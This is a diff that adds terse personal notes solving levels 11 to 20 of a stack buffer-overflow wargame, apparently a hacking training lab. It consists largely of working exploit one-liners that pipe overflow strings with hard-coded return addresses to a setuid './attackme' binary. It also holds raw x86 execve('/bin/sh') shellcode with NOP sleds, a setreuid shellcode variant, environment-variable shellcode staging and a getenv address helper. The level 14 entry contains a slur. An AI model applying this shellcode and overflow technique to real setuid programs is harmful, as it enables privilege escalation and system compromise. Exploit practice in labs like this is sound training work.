@@ -1,0 +1,114 @@
+==== hs wargame ===
+
+=== level 11 ===
+
+* what!@#$?
+* There are three method.
+  * export ss=shellcode , getenv, use it
+  * use gdb, get $esp address, use it
+  * eggshell 
+* address is slight changed and different evertime. so, use of bulk NOP (more 1000) before shell code
+* lesson: don't believe stack address I get. It's not correct even in gdb
+
+* code
+  * shelltemplate.c   // assembly code for shell code
+  * shellcode.c       // my shell code
+  * eggshell.c        // eggshell code with my shellcode
+  * eggshell_exploit11.c // eggshell for level 11
+  * getenv.c          // get env
+  * run.py            // process runner
+
+=== level 12 ===
+
+* it is like this
+* same as level 12, but use cat
+* shell code snippit
+(python -c 'print "A"*268+"<ENV_ADDR>"';cat) | ./attackme
+
+=== level 13 ===
+* have no clue
+* 0x418
+./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\xa4\xf7\xff\xbf"'`
+
+=== level 14 ===
+* what that nigga want?
+* lesson : check your buffer using gdb
+
+=== level 15 ===
+* guess what
+* lession : use cat, don't believe gdb
+            - no segmantation and normal finish you done it. use cat
+
+=== level 16 ===
+* about to cause mass
+* printit address: 0x8048500
+* gab : f0 (call var) - c8 (buf[20]) = 40
+* shell address : 0x80484d0
+* TOO EASY
+* 
+
+=== level 17 ===
+* king poetic
+* (python -c 'print "A"*40 +"\xd0\x84\x04\x08"';cat) | ./attackme
+
+=== level 18 ===
+* why did you do it
+* count addr : 0xff90
+* check addr : 0xff98
+* string addr :0xff9c
+
+* string[100] =  0xff04 (or 03)
+* gab string - check = 4
+
+* solution -4 then deadbeef
+* (python -c 'print "\x08\x08\x08\x08\xef\xbe\xad\xde"';cat) | ./attackme
+
+=== level 19 ===
+* swimming in pink
+* (python -c 'print "A"*20+"\x36\xf7\xff\xbf"*10';cat) | ./attackme
+* push 0xbc2, push 0xbc2, call 0x804834c, add $x10, %esp
+
+#include <stdio.h>
+#include <stdlib.h>
+ 
+int main( int argc, char *argv[] )
+{
+
+ 	setreuid( 3100, 3100 );
+	system("/bin/sh");
+} 
+
+
+804847c:	68 14 0c 00 00       	push   $0xc14
+ 8048481:	68 14 0c 00 00       	push   $0xc14
+ 8048486:	e8 c1 fe ff ff       	call   804834c <_init+0x68>
+ 804848b:	83 c4 10             	add    $0x10,%esp
+
+
+
+
+=== TIP ===
+* shell code snippit
+`python -c 'print "\x90"*2048+"\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xca\x89\xe3\x52\x53\x89\xe1\x89\xd0\xb0\x0b\xcd\x80"'`
+
+`python -c 'print "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xca\x89\xe3\x52\x53\x89\xe1\x89\xd0\xb0\x0b\xcd\x80"'`
+
+* shellcode to env var
+export shellcode=`python -c 'print "\x90"*2048+"\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xca\x89\xe3\x52\x53\x89\xe1\x89\xd0\xb0\x0b\xcd\x80"'`
+
+* getenv.c
+#include <stdio.h>
+void main(int argc, char* argv[])
+{
+  printf("%p\n", getenv(argv[1]));
+  return 0;
+}
+
+* shellcode for level20 (setreuid for 3010)
+export shellcode=`python -c 'print "\x90"*2048+"\x31\xc9\x66\xb9\x1c\x0c\x51\x51\xe8\xaf\x19\x0b\x38\x83\xc4\x10\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xca\x89\xe3\x52\x53\x89\xe1\x89\xd0\xb0\x0b\xcd\x80"'`
+
+
+
+* screen encodig : ctrl+a, :encoding eucKR, check for :info
+
+
